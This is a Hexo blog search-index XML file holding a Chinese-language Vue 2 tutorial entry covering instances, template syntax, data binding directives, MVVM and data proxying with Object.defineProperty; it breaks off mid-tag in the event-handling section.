<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>前端框架Vue2，你知道Vue2吗？</title>
      <link href="blog/Vue2/"/>
      <url>blog/Vue2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Vue简介"><a href="#Vue简介" class="headerlink" title="Vue简介"></a>Vue简介</h1><h3 id="什么是Vue"><a href="#什么是Vue" class="headerlink" title="什么是Vue?"></a>什么是Vue?</h3><p>Vue：是一套用于构建用户界面的<strong>渐进式框架</strong>。与其它大型框架不同的是，Vue 被设计为<strong>可以自底向上逐层应用</strong>。Vue 的核心库只<strong>关注视图层</strong>，不仅易于上手，还便于与第三方库或既有项目整合。</p><p>构建用户界面：将得到的数据展示到页面上</p><p>渐进式：可以自底向上逐层应用，简单应用：只需一个轻量小巧的核心库，复杂应用：可以引入各式各样的Vue插件</p><p>作者：尤雨溪</p><h3 id="Vue的特点？"><a href="#Vue的特点？" class="headerlink" title="Vue的特点？"></a>Vue的特点？</h3><ol><li><p>采用组件化模式，提高代码复用率、且让代码更好维护。</p></li><li><p>声明式编码，让编码人员无需直接操作DOM,提高开发效率</p><p><img src="image-20220417145959834.png" alt=""></p></li><li><p>使用虚拟DOM（根据data中的数据生成虚拟的DOM,将这些虚拟DOM存储在内存中）+优秀的Dif算法，尽量复用DOM节点。</p></li></ol><p><img src="image-20220417150549294.png" alt=""></p><p>补充：命令式编程，就是一步一步的指令来执行</p><p><img src="image-20220417150031252.png" alt=""></p><h1 id="搭建Vue开发环境"><a href="#搭建Vue开发环境" class="headerlink" title="搭建Vue开发环境"></a>搭建Vue开发环境</h1><ol><li>下载Vue.js文件</li><li>可以使用CDN引入在线的Vue.js文件</li><li>开发者工具（调式用的）</li></ol><p>Vue.js官网—学习—教程—安装—Vue Devtools—Installation—Get the Chrome Extension（这是谷歌的）</p><p>出现的警告：</p><p><img src="image-20220417154047396.png" alt=""></p><p>解决办法：添加一个调式工具（在扩展工具中）</p><p><img src="image-20220417154725542.png" alt=""></p><p>解决办法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vue.config.productionTip = <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>VScode安装插件：</p><p>右键打开浏览器：open in browser</p><p>自动刷新浏览器且自动保存：live server</p><p>代码片段（输入vue代码会提示完整的vue代码）：Vue 3 Snippets</p><h1 id="创建Vue实例"><a href="#创建Vue实例" class="headerlink" title="创建Vue实例"></a>创建Vue实例</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello,&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        // Vue的执行流程，通过el找到指定的容器，检测容器中的【Vue模板】有没有Vue语法，有则进行解析，以上面为例，找到了</span><span class="template-variable">&#123;&#123;<span class="name">name</span>&#125;&#125;</span><span class="xml">，则data中的数据找到name的值插到</span><span class="template-variable">&#123;&#123;<span class="name">name</span>&#125;&#125;</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el:<span class="string">&quot;#app&quot;</span>,<span class="comment">// el用于指定当前vue实例为哪个容器服务</span></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;<span class="comment">// data中用于存储数据，为el指定容器提供数据</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">                    name:<span class="string">&quot;ccy&quot;</span></span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>总结</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">初识Vue:</span></span><br><span class="line"><span class="comment">1.想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象：</span></span><br><span class="line"><span class="comment">2.root容器里的代码依然符合htm1规范，只不过混入了一些特殊的Vue语法：</span></span><br><span class="line"><span class="comment">3.root容器里的代码被称为[Vue模板]；</span></span><br><span class="line"><span class="comment">4.Vue实例和容器是一一对应的：一个容器对应一个vue实例，一个实例对应一个容器</span></span><br><span class="line"><span class="comment">5.真实开发中只有一个Vue实例，并且会配合着组件一起使用：</span></span><br><span class="line"><span class="comment">6.(&#123;xxx&#125;&#125;中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性：</span></span><br><span class="line"><span class="comment">7一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新：</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意区分：js表达式 和 js代码（语句）</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：</span></span><br><span class="line"><span class="comment">(1).a</span></span><br><span class="line"><span class="comment">(2).a+b</span></span><br><span class="line"><span class="comment">(3).demo(1)</span></span><br><span class="line"><span class="comment">(4).X==y?&#x27;a&#x27;:&#x27;b</span></span><br><span class="line"><span class="comment">2.js代码（语句）</span></span><br><span class="line"><span class="comment">(1).if()&#123;&#125;</span></span><br><span class="line"><span class="comment">(2).for()&#123;&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="el和data的两种写法"><a href="#el和data的两种写法" class="headerlink" title="el和data的两种写法"></a>el和data的两种写法</h3><h5 id="el的两种写法"><a href="#el的两种写法" class="headerlink" title="el的两种写法"></a>el的两种写法</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//el:&quot;#app&quot;,// 第一种写法</span></span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            url:<span class="string">&quot;http://localhost:8000/server&quot;</span>,</span></span><br><span class="line"><span class="javascript">            hello:<span class="string">&quot;hello worrd!&quot;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="javascript">    vm.$mount(<span class="string">&#x27;#app&#x27;</span>)<span class="comment">// 第二种写法 mount是挂载的意思 </span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="data的两种写法"><a href="#data的两种写法" class="headerlink" title="data的两种写法"></a>data的两种写法</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 对象写法</span></span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            url:<span class="string">&quot;http://localhost:8000/server&quot;</span>,</span></span><br><span class="line"><span class="javascript">            hello:<span class="string">&quot;hello worrd!&quot;</span></span></span><br><span class="line">        &#125;，</span><br><span class="line"><span class="javascript">        <span class="comment">// 函数写法</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">            url:<span class="string">&quot;http://localhost:8000/server&quot;</span>,</span></span><br><span class="line"><span class="javascript">            hello:<span class="string">&quot;hello worrd!&quot;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">data与el的2种写法</span></span><br><span class="line"><span class="comment">1.e1有2种写法</span></span><br><span class="line"><span class="comment">(1).new Vue时候配置e1属性。</span></span><br><span class="line"><span class="comment">(2).先创建Vue实例，随后再通过vm.$mount(&#x27;#root&#x27;)指定el的值。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2.data有2种写法</span></span><br><span class="line"><span class="comment">(1).对象式</span></span><br><span class="line"><span class="comment">(2).函数式</span></span><br><span class="line"><span class="comment">如何选择：日前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3.一个重要的原则：</span></span><br><span class="line"><span class="comment">由Vue管理的函数，一定不要写箭头函数，一且写了箭头函数，this就不再是Vue实例了，而是window</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Vue模板语法"><a href="#Vue模板语法" class="headerlink" title="Vue模板语法"></a>Vue模板语法</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Vue模板语法有2大类：</span></span><br><span class="line"><span class="comment">1.插值语法：</span></span><br><span class="line"><span class="comment">功能：用于解析标签体内容。</span></span><br><span class="line"><span class="comment">写法：&#123;xxx&#125;,xxx是js表达式（可以理解成是动态的数据），且可以直接读取到data中的所有属性。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2指令语法：</span></span><br><span class="line"><span class="comment">功能：用于解析标签(包括：标签属性、标签体内容、绑定事件。···)</span></span><br><span class="line"><span class="comment">举例：v-bind:href=&quot;xxx&quot;或简写为：href=&quot;xxx&quot;,xxx同样要写js表达式，且可以直接读取到data中的所有属性。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="插值语法"><a href="#插值语法" class="headerlink" title="插值语法"></a>插值语法</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello,&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="指令语法"><a href="#指令语法" class="headerlink" title="指令语法"></a>指令语法</h3><h5 id="v-bind-指令"><a href="#v-bind-指令" class="headerlink" title="v-bind 指令"></a>v-bind 指令</h5><p>单向数据绑定动态属性，v-bind简写为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:href</span>=<span class="string">&quot;url&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span>=<span class="string">&quot;url&quot;</span> <span class="attr">:x</span>=<span class="string">&quot;hello&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            url:<span class="string">&quot;http://localhost:8000/server&quot;</span>,</span></span><br><span class="line"><span class="javascript">            hello:<span class="string">&quot;hello worrd!&quot;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="v-model-指令"><a href="#v-model-指令" class="headerlink" title="v-model 指令"></a>v-model 指令</h5><p>双向数据绑定动态属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model:value</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            name:<span class="string">&quot;ccy&quot;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Vue中有2种数据绑定的方式：</span></span><br><span class="line"><span class="comment">1.单向绑定(v-bind):数据只能从data流向页面。</span></span><br><span class="line"><span class="comment">2,双向绑定(v-model):数据不仅能从data流向页面，还可以从页面流向data.</span></span><br><span class="line"><span class="comment">备注：</span></span><br><span class="line"><span class="comment">1.双向绑定一般都应用在表单类元素上(如：input、select等)</span></span><br><span class="line"><span class="comment">2.v-model:value可以简写为v-model,因为v-model默认收集的就是value值。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="4-2-3-v-on-指令"><a href="#4-2-3-v-on-指令" class="headerlink" title="4.2.3 v-on 指令"></a>4.2.3 v-on 指令</h5><p>绑定事件，简写：@</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;fun&quot;</span>&gt;</span>点击触发事件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;fun&quot;</span>&gt;</span>点击触发事件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="5-MVVM模型"><a href="#5-MVVM模型" class="headerlink" title="5. MVVM模型"></a>5. MVVM模型</h1><ol><li>M：模型(Model)：对应data中的数据</li><li>V：视图View：模板</li><li>VM：视图模型(ViewModel)：Vue实例对象</li></ol><p><img src="image-20220417173657357.png" alt=""></p><p><img src="image-20220417174452747.png" alt=""></p><p>总结：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MVVM模型</span><br><span class="line">1.M:模型(Model):data中的数据</span><br><span class="line">2.V:视图(View):模板代码</span><br><span class="line">3.VM:视图模型(ViewModel):Vue实例</span><br><span class="line">观察发现：</span><br><span class="line">1.data中所有的属性，最后都出现在了vm身上。</span><br><span class="line">2.vm身上所有的属性及Vue原型上所有属性，在Vue模板中都可以直接使用。</span><br></pre></td></tr></table></figure><h1 id="数据代理"><a href="#数据代理" class="headerlink" title="数据代理"></a>数据代理</h1><h3 id="回顾Object-defineProperty-方法"><a href="#回顾Object-defineProperty-方法" class="headerlink" title="回顾Object.defineProperty()方法"></a>回顾Object.defineProperty()方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建对象：</span></span><br><span class="line"><span class="keyword">var</span> language = <span class="string">&quot;en&quot;</span></span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    firstName: <span class="string">&quot;Bill&quot;</span>,</span><br><span class="line">    lastName : <span class="string">&quot;Gates&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更改属性：</span></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(person, <span class="string">&quot;language&quot;</span>, &#123;</span><br><span class="line">    value: <span class="string">&quot;EN&quot;</span>,</span><br><span class="line">    writable : <span class="literal">true</span>,<span class="comment">// 控制属性是否可以被修改，默认值是false</span></span><br><span class="line">    enumerable : <span class="literal">true</span>,<span class="comment">// 控制属性是否可以枚举，默认值是false</span></span><br><span class="line">    configurable : <span class="literal">true</span><span class="comment">// 控制属性是否可以被删除，默认值是false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当有人读取person的language属性时，get函数（getter）就会被调用，且返回值就是language的值</span></span><br><span class="line">    get : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> language &#125;,</span><br><span class="line">    <span class="comment">// 也可以这么写</span></span><br><span class="line">    <span class="comment">//get() &#123; return language &#125;,</span></span><br><span class="line">    <span class="comment">// 当有人修改person的language属性时，set函数（setter）就会被调用，且会收到修改的具体值</span></span><br><span class="line">    set : <span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123; language = value.toUpperCase()&#125;</span><br><span class="line"><span class="comment">// 也可以这么写</span></span><br><span class="line"><span class="comment">//set(value) &#123; language = value.toUpperCase()&#125;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更改语言</span></span><br><span class="line">person.language = <span class="string">&quot;enss&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示语言</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;demo&quot;</span>).innerHTML = person.language;<span class="comment">// ENSS</span></span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="数据代理-1"><a href="#数据代理-1" class="headerlink" title="数据代理"></a>数据代理</h3><p>通过一个对象代理对另一个对象中属性的操作(读/写)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> obj &#123;<span class="attr">x</span>:<span class="number">100</span>&#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> obj2 &#123;<span class="attr">y</span>:<span class="number">200</span>&#125;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">Object</span>.defineProperty(obj2,<span class="string">&#x27;x&#x27;</span>,&#123;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">get</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> obj.x</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">set</span>(<span class="params">value</span>)</span>&#123;</span></span><br><span class="line">            obj.x value</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Vue中的数据代理"><a href="#Vue中的数据代理" class="headerlink" title="Vue中的数据代理"></a>Vue中的数据代理</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Vue模板中原本是这样获取data中的数据 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello,&#123;&#123;_data.name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 通过数据代理，set(value)&#123; name = value&#125; 可以这么写--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello,&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="image-20220417195841048.png" alt=""></p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.Vue中的数据代理：</span></span><br><span class="line"><span class="comment">通过vm对象来代理data对象中属性的操作(读/写)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2.Vue中数据代理的好处：</span></span><br><span class="line"><span class="comment">更加方便的操作data中的数据</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3.基本原理：</span></span><br><span class="line"><span class="comment">通过Object.defineProperty()把data对象中所有属性添加到vm上。</span></span><br><span class="line"><span class="comment">为每一个添加到vm上的属性，都指定一个getter/setter.</span></span><br><span class="line"><span class="comment">在getter,setter内部去操作(读/写)data中对应的属性。</span></span><br><span class="line"><span class="comment">我自己的理解：</span></span><br><span class="line"><span class="comment">把data对象中的数据通过Object.defineProperty()方法添加到vm._data上，vm._data的数据经过数据代理，vm._data直接添加到了vm实例上，然后从_data.name直接变成name访问</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el:<span class="string">&quot;#app&quot;</span>,</span><br><span class="line">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>&#123;</span><br><span class="line">            name:<span class="string">&quot;ccy&quot;</span>,</span><br><span class="line">            pwd:<span class="string">&quot;123456&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 理解总结的意思</span></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(vm, <span class="string">&quot;name&quot;</span>, &#123;</span><br><span class="line">    <span class="function"><span class="title">get</span>(<span class="params"></span>)</span> &#123; <span class="keyword">return</span> name &#125;,</span><br><span class="line">    <span class="function"><span class="title">set</span>(<span class="params">value</span>)</span> &#123; name = value &#125;</span><br><span class="line">&#125;);</span><br><span class="line">vm.name = vm._data.name</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(vm, <span class="string">&quot;pwd&quot;</span>, &#123;</span><br><span class="line">    <span class="function"><span class="title">get</span>(<span class="params"></span>)</span> &#123; <span class="keyword">return</span> pwd &#125;,</span><br><span class="line">    <span class="function"><span class="title">set</span>(<span class="params">value</span>)</span> &#123; pwd = value &#125;</span><br><span class="line">&#125;);</span><br><span class="line">vm.pwd = vm._data.pwd</span><br></pre></td></tr></table></figure><p><strong>注意：data中的数据一变化，Vue模板就会重新被解析</strong></p><h1 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h1><h3 id="绑定点击事件"><a href="#绑定点击事件" class="headerlink" title="绑定点击事件"></a>绑定点击事件</h3><blockquote><p>v-on:click</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 绑定事件的时候，@xxx=&quot;yyy&quot; yyy可以写一些简单的语句 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;button @click=&quot;isHost = !isHost&quot;&gt;点击触发事件&lt;/button&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span 